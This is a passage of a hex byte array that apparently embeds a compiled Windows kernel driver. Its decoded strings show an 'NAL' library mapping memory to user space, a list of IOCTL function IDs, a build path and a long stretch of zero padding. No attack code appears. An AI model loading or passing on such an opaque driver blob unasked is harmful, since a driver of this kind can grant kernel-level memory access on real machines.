    0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45,
    0x78, 0x3A, 0x20, 0x47, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x5F, 0x57, 0x69, 0x6E, 0x4D, 0x65, 0x6D,
    0x6F, 0x72, 0x79, 0x4D, 0x61, 0x70, 0x54, 0x61, 0x62, 0x6C, 0x65, 0x5B, 0x25, 0x64, 0x5D, 0x2E,
    0x4D, 0x61, 0x70, 0x70, 0x65, 0x64, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x3D, 0x20,
    0x30, 0x78, 0x25, 0x70, 0x20, 0x3D, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70, 0x0A, 0x00, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45,
    0x78, 0x3A, 0x20, 0x4C, 0x6F, 0x6F, 0x6B, 0x69, 0x6E, 0x67, 0x20, 0x74, 0x6F, 0x20, 0x75, 0x6E,
    0x6D, 0x61, 0x70, 0x20, 0x30, 0x78, 0x25, 0x70, 0x2C, 0x20, 0x4C, 0x65, 0x6E, 0x67, 0x74, 0x68,
    0x20, 0x25, 0x64, 0x2C, 0x20, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x20, 0x25,
    0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x5F, 0x4E, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x65, 0x6D, 0x6F,
    0x72, 0x79, 0x4E, 0x6F, 0x6E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x20, 0x2D, 0x20, 0x4D, 0x6D, 0x41,
    0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75,
    0x73, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x0A, 0x00,
    0x5F, 0x4E, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x65, 0x6D, 0x6F,
    0x72, 0x79, 0x4E, 0x6F, 0x6E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x20, 0x2D, 0x20, 0x56, 0x69, 0x72,
    0x74, 0x75, 0x61, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78,
    0x25, 0x70, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x5F, 0x4E, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x65, 0x6D, 0x6F,
    0x72, 0x79, 0x4E, 0x6F, 0x6E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x20, 0x2D, 0x20, 0x4D, 0x6D, 0x4D,
    0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x20, 0x66, 0x61,
    0x69, 0x6C, 0x65, 0x64, 0x2E, 0x20, 0x46, 0x72, 0x65, 0x65, 0x69, 0x6E, 0x67, 0x20, 0x4D, 0x44,
    0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x5F, 0x4E, 0x61, 0x6C, 0x46, 0x72, 0x65, 0x65, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x4E, 0x6F,
    0x6E, 0x50, 0x61, 0x67, 0x65, 0x64, 0x45, 0x78, 0x3A, 0x20, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79,
    0x20, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x69, 0x73, 0x20, 0x6E,
    0x6F, 0x74, 0x20, 0x65, 0x6E, 0x74, 0x65, 0x72, 0x65, 0x64, 0x20, 0x69, 0x6E, 0x74, 0x6F, 0x20,
    0x74, 0x68, 0x65, 0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x2E, 0x20, 0x4E, 0x6F, 0x74, 0x20, 0x66,
    0x72, 0x65, 0x65, 0x69, 0x6E, 0x67, 0x20, 0x61, 0x6E, 0x79, 0x74, 0x68, 0x69, 0x6E, 0x67, 0x2E,
    0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x4D, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78,
    0x3A, 0x20, 0x2A, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73,
    0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x28, 0x6D, 0x61, 0x70, 0x70, 0x65, 0x64,
    0x20, 0x74, 0x6F, 0x20, 0x75, 0x73, 0x65, 0x72, 0x29, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x4D, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78,
    0x3A, 0x20, 0x2A, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73,
    0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25, 0x70, 0x20, 0x28, 0x6E, 0x6F, 0x74, 0x20, 0x6D, 0x61,
    0x70, 0x70, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x75, 0x73, 0x65, 0x72, 0x29, 0x0A, 0x00, 0xCC,
    0x4E, 0x61, 0x6C, 0x4D, 0x6D, 0x61, 0x70, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x45, 0x78,
    0x3A, 0x20, 0x56, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x3D, 0x20, 0x30, 0x78, 0x25,
    0x70, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x54, 0x50, 0x4E, 0x50, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x54, 0x72, 0x61, 0x6E, 0x73, 0x6C, 0x61, 0x74, 0x65, 0x64, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x5C, 0x00, 0x52, 0x00, 0x45, 0x00, 0x47, 0x00, 0x49, 0x00, 0x53, 0x00, 0x54, 0x00, 0x52, 0x00,
    0x59, 0x00, 0x5C, 0x00, 0x4D, 0x00, 0x41, 0x00, 0x43, 0x00, 0x48, 0x00, 0x49, 0x00, 0x4E, 0x00,
    0x45, 0x00, 0x5C, 0x00, 0x48, 0x00, 0x41, 0x00, 0x52, 0x00, 0x44, 0x00, 0x57, 0x00, 0x41, 0x00,
    0x52, 0x00, 0x45, 0x00, 0x5C, 0x00, 0x52, 0x00, 0x45, 0x00, 0x53, 0x00, 0x4F, 0x00, 0x55, 0x00,
    0x52, 0x00, 0x43, 0x00, 0x45, 0x00, 0x4D, 0x00, 0x41, 0x00, 0x50, 0x00, 0x5C, 0x00, 0x50, 0x00,
    0x6E, 0x00, 0x50, 0x00, 0x20, 0x00, 0x4D, 0x00, 0x61, 0x00, 0x6E, 0x00, 0x61, 0x00, 0x67, 0x00,
    0x65, 0x00, 0x72, 0x00, 0x5C, 0x00, 0x50, 0x00, 0x6E, 0x00, 0x70, 0x00, 0x4D, 0x00, 0x61, 0x00,
    0x6E, 0x00, 0x61, 0x00, 0x67, 0x00, 0x65, 0x00, 0x72, 0x00, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x6F, 0x6F, 0x6B, 0x69, 0x6E, 0x67, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x6D, 0x61, 0x74, 0x63,
    0x68, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x25, 0x64, 0x2F, 0x25, 0x64, 0x2F, 0x25, 0x64, 0x0A, 0x00,
    0x5F, 0x4E, 0x61, 0x6C, 0x52, 0x65, 0x61, 0x64, 0x50, 0x63, 0x69, 0x44, 0x65, 0x76, 0x69, 0x63,
    0x65, 0x43, 0x6F, 0x75, 0x6E, 0x74, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x25, 0x64, 0x20,
    0x64, 0x65, 0x76, 0x69, 0x63, 0x65, 0x73, 0x20, 0x28, 0x25, 0x64, 0x29, 0x0A, 0x00, 0xCC, 0xCC,
    0x63, 0x3A, 0x5C, 0x75, 0x73, 0x65, 0x72, 0x73, 0x5C, 0x63, 0x6C, 0x6F, 0x75, 0x64, 0x62, 0x75,
    0x69, 0x6C, 0x64, 0x5C, 0x33, 0x33, 0x37, 0x32, 0x34, 0x34, 0x5C, 0x73, 0x64, 0x6B, 0x5C, 0x6E,
    0x61, 0x6C, 0x5C, 0x73, 0x72, 0x63, 0x5C, 0x77, 0x69, 0x6E, 0x6E, 0x74, 0x5F, 0x77, 0x64, 0x6D,
    0x5C, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x5C, 0x77, 0x69, 0x6E, 0x64, 0x72, 0x69, 0x76, 0x65,
    0x72, 0x70, 0x63, 0x69, 0x5F, 0x69, 0x2E, 0x63, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x46, 0x69, 0x6C, 0x6C, 0x4B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x78,
    0x74, 0x3A, 0x20, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73,
    0x73, 0x3A, 0x20, 0x25, 0x70, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x5F, 0x4E, 0x61, 0x6C, 0x48, 0x61, 0x73, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x72, 0x75, 0x70, 0x74,
    0x4F, 0x63, 0x63, 0x75, 0x72, 0x72, 0x65, 0x64, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6E, 0x69,
    0x6E, 0x67, 0x20, 0x25, 0x73, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x46, 0x41, 0x4C, 0x53, 0x45, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x54, 0x52, 0x55, 0x45, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
    0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x46, 0x75, 0x63, 0x74, 0x69,
    0x6F, 0x6E, 0x49, 0x64, 0x20, 0x3D, 0x20, 0x25, 0x64, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
    0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57,
    0x49, 0x4E, 0x5F, 0x49, 0x53, 0x5F, 0x41, 0x44, 0x41, 0x50, 0x54, 0x45, 0x52, 0x5F, 0x49, 0x4E,
    0x5F, 0x55, 0x53, 0x45, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63,
    0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C,
    0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
    0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57,
    0x49, 0x4E, 0x5F, 0x41, 0x44, 0x41, 0x50, 0x54, 0x45, 0x52, 0x5F, 0x49, 0x4E, 0x5F, 0x55, 0x53,
    0x45, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F,
    0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC,
    0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
    0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57,
    0x49, 0x4E, 0x5F, 0x44, 0x52, 0x49, 0x56, 0x45, 0x52, 0x5F, 0x47, 0x45, 0x54, 0x5F, 0x52, 0x45,
    0x46, 0x5F, 0x43, 0x4F, 0x55, 0x4E, 0x54, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46,
    0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E,
    0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
    0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57,
    0x49, 0x4E, 0x5F, 0x4F, 0x53, 0x5F, 0x44, 0x45, 0x56, 0x49, 0x43, 0x45, 0x5F, 0x46, 0x55, 0x4E,
    0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61,
    0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
    0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57,
    0x49, 0x4E, 0x5F, 0x46, 0x52, 0x45, 0x45, 0x5F, 0x44, 0x45, 0x56, 0x5F, 0x43, 0x4F, 0x4E, 0x54,
    0x45, 0x58, 0x54, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74,
    0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A,
    0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
    0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57,
    0x49, 0x4E, 0x5F, 0x41, 0x4C, 0x4C, 0x4F, 0x43, 0x5F, 0x44, 0x45, 0x56, 0x5F, 0x43, 0x4F, 0x4E,
    0x54, 0x45, 0x58, 0x54, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63,
    0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C,
    0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
    0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57,
    0x49, 0x4E, 0x5F, 0x47, 0x45, 0x54, 0x5F, 0x53, 0x59, 0x4D, 0x42, 0x4F, 0x4C, 0x49, 0x43, 0x5F,
    0x4E, 0x41, 0x4D, 0x45, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63,
    0x74, 0x69, 0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C,
    0x0A, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4E, 0x61, 0x6C, 0x52, 0x65, 0x73, 0x6F, 0x6C, 0x76, 0x65, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63,
    0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63, 0x74, 0x6C, 0x3A, 0x20, 0x4E, 0x41, 0x4C, 0x5F, 0x57,
    0x49, 0x4E, 0x5F, 0x47, 0x45, 0x54, 0x5F, 0x50, 0x44, 0x4F, 0x5F, 0x50, 0x4F, 0x49, 0x4E, 0x54,
    0x45, 0x52, 0x5F, 0x46, 0x55, 0x4E, 0x43, 0x49, 0x44, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69,
    0x6F, 0x6E, 0x44, 0x61, 0x74, 0x61, 0x20, 0x69, 0x73, 0x20, 0x4E, 0x55, 0x4C, 0x4C, 0x0A, 0x00,
    0x4E, 0x61, 0x6C, 0x4F, 0x73, 0x53, 0x70, 0x65, 0x63, 0x69, 0x66, 0x69, 0x63, 0x49, 0x6F, 0x63,
    0x74, 0x6C, 0x3A, 0x20, 0x46, 0x75, 0x6E, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x49, 0x64, 0x20, 0x3D,
    0x20, 0x25, 0x64, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x68, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xBA, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCC, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xE2, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFA, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0E, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x26, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x32, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x54, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x74, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA0, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB2, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC8, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE6, 0x25, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x8A, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x28, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x50, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x84, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8E, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA2, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xCC, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE2, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xEE, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x14, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2C, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x4A, 0x27, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x26, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x24, 0x5D, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0xC3, 0xEA, 0x84, 0x52, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,
    0x74, 0x00, 0x00, 0x00, 0x6C, 0x61, 0x00, 0x00, 0x6C, 0x4D, 0x00, 0x00, 0x52, 0x53, 0x44, 0x53,
    0x50, 0xBB, 0x0A, 0xBE, 0xA9, 0x09, 0x86, 0x42, 0x88, 0x6B, 0x33, 0x67, 0x56, 0x27, 0x97, 0x21,
    0x01, 0x00, 0x00, 0x00, 0x63, 0x3A, 0x5C, 0x75, 0x73, 0x65, 0x72, 0x73, 0x5C, 0x63, 0x6C, 0x6F,
